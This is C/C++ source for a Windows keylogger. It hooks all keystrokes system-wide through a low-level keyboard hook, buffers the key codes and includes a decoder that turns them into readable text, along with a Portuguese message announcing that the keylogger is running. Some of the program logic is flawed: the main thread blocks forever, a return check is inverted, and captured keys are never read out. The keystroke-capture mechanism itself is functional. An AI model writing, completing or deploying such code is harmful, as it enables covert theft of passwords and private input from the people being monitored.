#include <stdio.h>
#include <string>
#include <assert.h>
#include <windows.h>
#include <winuser.h>

#define KEY_BUFFER_SIZE 4096

typedef struct KeyMap {
    int keybuffer[KEY_BUFFER_SIZE];
    int key_head;
    int key_tail;
} KeyMap;

KeyMap map = {0};

CRITICAL_SECTION buffer_lock;

int pop_key(KeyMap* map) {
    int key = -1;
    EnterCriticalSection(&buffer_lock);
    if (map->key_head != map->key_tail) {
        key = map->keybuffer[map->key_tail];
        map->key_tail = (map->key_tail + 1) % KEY_BUFFER_SIZE;
    }
    LeaveCriticalSection(&buffer_lock);
    return key;
}

int push_key(KeyMap* map, int key) {
    int next_pos = (map->key_head + 1) % KEY_BUFFER_SIZE;
    EnterCriticalSection(&buffer_lock);
    if (next_pos != map->key_tail) {
        map->keybuffer[map->key_head] = key;
        map->key_head = next_pos;
        LeaveCriticalSection(&buffer_lock);
        return 0;
    }
    LeaveCriticalSection(&buffer_lock);
    return -1;
}

int flush_buffer(KeyMap* map) {
    int count = 0;
    EnterCriticalSection(&buffer_lock);

    if (map->key_head >= map->key_tail) {
        count = map->key_head - map->key_tail;
    } else {
        count = (KEY_BUFFER_SIZE - map->key_tail) + map->key_head;
    }

    memset(map->keybuffer, 0, sizeof(map->keybuffer));

    map->key_head = 0;
    map->key_tail = 0;

    LeaveCriticalSection(&buffer_lock);
    return count;
}

std::string key_decode(int vkCode) {
    switch (vkCode) {
        case VK_BACK:      return "[BACKSPACE]";
        case VK_TAB:       return "[TAB]";
        case VK_RETURN:    return "[ENTER]";
        case VK_SHIFT:     return "[SHIFT]";
        case VK_LSHIFT:    return "[LSHIFT]";
        case VK_RSHIFT:    return "[RSHIFT]";
        case VK_CONTROL:   return "[CTRL]";
        case VK_LCONTROL:  return "[LCTRL]";
        case VK_RCONTROL:  return "[RCTRL]";
        case VK_MENU:      return "[ALT]";
        case VK_LMENU:     return "[LALT]";
        case VK_RMENU:     return "[RALT]";
        case VK_CAPITAL:   return "[CAPSLOCK]";
        case VK_ESCAPE:    return "[ESC]";
        case VK_SPACE:     return " ";
        case VK_DELETE:    return "[DEL]";
        case VK_INSERT:    return "[INS]";
        case VK_HOME:      return "[HOME]";
        case VK_END:       return "[END]";
        case VK_PRIOR:     return "[PAGEUP]";
        case VK_NEXT:      return "[PAGEDOWN]";
        case VK_LEFT:      return "[LEFT]";
        case VK_UP:        return "[UP]";
        case VK_RIGHT:     return "[RIGHT]";
        case VK_DOWN:      return "[DOWN]";
        case VK_SNAPSHOT:  return "[PRINTSCREEN]";
        case VK_PAUSE:     return "[PAUSE]";
        case VK_NUMLOCK:   return "[NUMLOCK]";
        case VK_SCROLL:    return "[SCROLLLOCK]";
        default: break;
    }

    // Function keys F1-F12
    if (vkCode >= VK_F1 && vkCode <= VK_F12) {
        return "[F" + std::to_string(vkCode - VK_F1 + 1) + "]";
    }

    // Numpad keys
    if (vkCode >= VK_NUMPAD0 && vkCode <= VK_NUMPAD9) {
        return std::to_string(vkCode - VK_NUMPAD0);
    }
    if (vkCode == VK_ADD) return "+";
    if (vkCode == VK_SUBTRACT) return "-";
    if (vkCode == VK_MULTIPLY) return "*";
    if (vkCode == VK_DIVIDE) return "/";

    // Letters and numbers via ToUnicode
    BYTE keyboardState[256] = {0};
    if (GetKeyboardState(keyboardState) == 0) return "[UNK]";

    // Handle CapsLock and Shift
    if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0) keyboardState[VK_CAPITAL] |= 0x01;
    if ((GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0) keyboardState[VK_SHIFT] |= 0x80;

    WCHAR buffer[8] = {0};
    int result = ToUnicode(vkCode, MapVirtualKey(vkCode, 0), keyboardState, buffer, 8, 0);
    if (result > 0) {
        char str[8];
        WideCharToMultiByte(CP_UTF8, 0, buffer, result, str, sizeof(str), NULL, NULL);
        str[result] = 0;
        return std::string(str);
    }

    return "[UNK]"; // Unknown key
}

LRESULT CALLBACK low_level_keyboard_proc(int code, WPARAM wParam, LPARAM lParam) {
    if (code == HC_ACTION) {
        KBDLLHOOKSTRUCT *keyboard = (KBDLLHOOKSTRUCT *)lParam;

        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            push_key(&map, keyboard->vkCode);
        }
    }

    return CallNextHookEx(NULL, code, wParam, lParam);
}

int keylogger() {
    HHOOK keyhook;
    HINSTANCE exe = GetModuleHandle(NULL);

    if (!exe) {
        return 1;
    }

    keyhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)low_level_keyboard_proc, exe, 0);
    MSG key_msg;
    while (GetMessage(&key_msg, NULL, 0, 0) != 0) {
        TranslateMessage(&key_msg);
        DispatchMessage(&key_msg);
    }
    UnhookWindowsHookEx(keyhook);

    return 0;
}

DWORD start_logging() {
    HANDLE hthread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE) keylogger,
        NULL,
        0,
        NULL
    );
    return WaitForSingleObject(hthread, INFINITE);
}

int main() {
    InitializeCriticalSection(&buffer_lock);

    DWORD h = start_logging();
    if (!h) {
        DeleteCriticalSection(&buffer_lock);
        return 1;
    }

    printf("Keylogger rodando. Pressione Enter para sair...\n");
    getchar();

    DeleteCriticalSection(&buffer_lock);
    return 0;
}